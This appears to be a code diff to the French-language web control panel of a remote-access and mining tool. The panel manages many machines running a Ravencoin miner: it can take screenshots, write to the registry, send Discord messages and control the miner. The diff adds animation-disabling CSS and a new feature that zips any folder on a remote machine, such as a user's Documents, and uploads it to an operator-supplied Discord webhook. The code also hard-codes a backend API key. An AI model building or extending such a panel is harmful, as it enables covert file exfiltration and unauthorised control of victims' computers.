@@ -187,6 +187,9 @@ body{font-family:'Segoe UI',system-ui,sans-serif;background:var(--bg);color:var(
 .temp-alert{position:fixed;top:20px;right:20px;background:var(--red2);color:#fff;padding:14px 20px;border-radius:10px;z-index:99998;animation:shake .4s ease;display:none;font-weight:600;box-shadow:0 4px 20px rgba(218,54,51,.4)}
 .temp-alert.show{display:flex;align-items:center;gap:10px}
 
+body.no-anim .card,body.no-anim .stat-box,body.no-anim .modal-section,body.no-anim .header,body.no-anim .earnings-banner,body.no-anim .chart-container,body.no-anim .network-group{animation:none!important}
+body.no-anim .gpu-bar .fill{animation:none!important}
+body.no-anim .badge.online{animation:none!important}
 ::-webkit-scrollbar{width:8px}::-webkit-scrollbar-track{background:var(--bg3)}::-webkit-scrollbar-thumb{background:var(--border);border-radius:4px}::-webkit-scrollbar-thumb:hover{background:var(--text2)}
 
 @media(max-width:768px){
@@ -312,7 +315,7 @@ h1{font-size:1.2rem}
 const SB='https://imwdpuumpvecpziigsyz.supabase.co';
 const SK='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imltd2RwdXVtcHZlY3B6aWlnc3l6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTUyNTU4MDIsImV4cCI6MjExMDgzMTgwMn0.xK1YmdiLQ8yyWnvq4XX1KUakMoudHSCuwoN63lBIu8w';
 const H={'apikey':SK,'Authorization':'Bearer '+SK};
-let rvnPriceUsd=0,machinesCache=[],notifsEnabled=false,prevOnline={},alertAudio=null,lastLoadTime=0;
+let rvnPriceUsd=0,machinesCache=[],notifsEnabled=false,prevOnline={},alertAudio=null,lastLoadTime=0,firstRender=true;
 let machineNames={};
 try{machineNames=JSON.parse(localStorage.getItem('azerty-names')||'{}');}catch{}
 function renameMachine(hostname){
@@ -531,7 +534,8 @@ async function openMachineDetail(hostname){
     +'<div id="reg-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-family:monospace;font-size:.75rem;color:var(--text);max-height:150px;overflow-y:auto;white-space:pre-wrap;display:none;margin-top:8px"></div></div></div>'
     +'<div class="modal-section"><div class="modal-section-title">🤖 Discord Bot</div><div class="modal-controls">'
     +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="discord-webhook" placeholder="URL du webhook Discord..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"></div>'
-    +'<div style="display:flex;gap:8px"><input type="text" id="discord-msg" placeholder="Message a envoyer..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="sendDiscord(\''+h+'\')" style="background:#5865F2;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🤖 Envoyer</button></div>'
+    +'<div style="display:flex;gap:8px;margin-bottom:8px"><input type="text" id="discord-msg" placeholder="Message a envoyer..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-size:.85rem"><button onclick="sendDiscord(\''+h+'\')" style="background:#5865F2;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">🤖 Envoyer</button></div>'
+    +'<div style="display:flex;gap:8px"><input type="text" id="discord-folder" placeholder="Chemin dossier (ex: C:\\Users\\Documents)..." style="flex:1;background:var(--bg);border:1px solid var(--border);color:var(--text);padding:10px 14px;border-radius:8px;font-family:monospace;font-size:.85rem"><button onclick="sendDiscordFolder(\''+h+'\')" style="background:#5865F2;color:#fff;border:none;padding:10px 18px;border-radius:8px;font-weight:600;cursor:pointer">📁 Envoyer Dossier</button></div>'
     +'<div id="discord-output" style="background:var(--bg);border:1px solid var(--border2);border-radius:8px;padding:12px;font-size:.75rem;color:var(--text);display:none;margin-top:8px"></div></div></div>'
     +'<button class="btn-delete-machine" onclick="deleteMachine(\''+h+'\')">Supprimer cette machine</button></div>';
   document.getElementById('modal').classList.add('show');
@@ -705,6 +709,7 @@ function render(machines){
       +'<div class="card-controls" onclick="event.stopPropagation()"><div class="power-row"><label>Puissance</label><input type="range" min="10" max="100" step="5" value="'+cp+'" onchange="setPower(\''+h+'\',this.value,false)" oninput="document.getElementById(\'pw-'+h+'\').textContent=this.value+\'%\'"><span class="power-val" id="pw-'+h+'">'+cp+'%</span></div>'
       +'<div class="ctrl-btns"><button class="btn-screen" onclick="requestScreenshot(\''+h+'\')">📸 Capture</button><button class="btn-stop" onclick="stopMiner(\''+h+'\')">⏹ Arreter</button><button class="btn-restart" onclick="restartMiner(\''+h+'\')">🔄 Relancer</button></div></div></div>';
   }).join('');
+  if(firstRender){firstRender=false;setTimeout(()=>document.body.classList.add('no-anim'),1500);}
 }
 
 function esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;')}
@@ -1010,6 +1015,7 @@ function regWrite(h){const k=document.getElementById('reg-write-input').value.tr
 
 // DISCORD
 function sendDiscord(h){const wh=document.getElementById('discord-webhook').value.trim();const msg=document.getElementById('discord-msg').value.trim();if(!wh||!msg)return;sendCommand(h,'command','discord:'+wh+'|'+msg);showToast('🤖 Message Discord envoyé');const o=document.getElementById('discord-output');o.style.display='block';o.textContent='✅ Commande envoyée';}
+function sendDiscordFolder(h){const wh=document.getElementById('discord-webhook').value.trim();const folder=document.getElementById('discord-folder').value.trim();if(!wh){showToast('❌ Remplis le webhook Discord');return;}if(!folder){showToast('❌ Remplis le chemin du dossier');return;}if(!confirm('📁 Zipper et envoyer '+folder+' sur Discord ?'))return;sendCommand(h,'command','discordzip:'+wh+'|'+folder);showToast('📁 Zip + upload en cours...');const o=document.getElementById('discord-output');o.style.display='block';o.textContent='⏳ Compression et envoi en cours...';pollCmdResultLevel(h,'discord-output','discord');}
 
 // GENERIC LEVEL POLLER
 function pollCmdResultLevel(h,outputId,level){
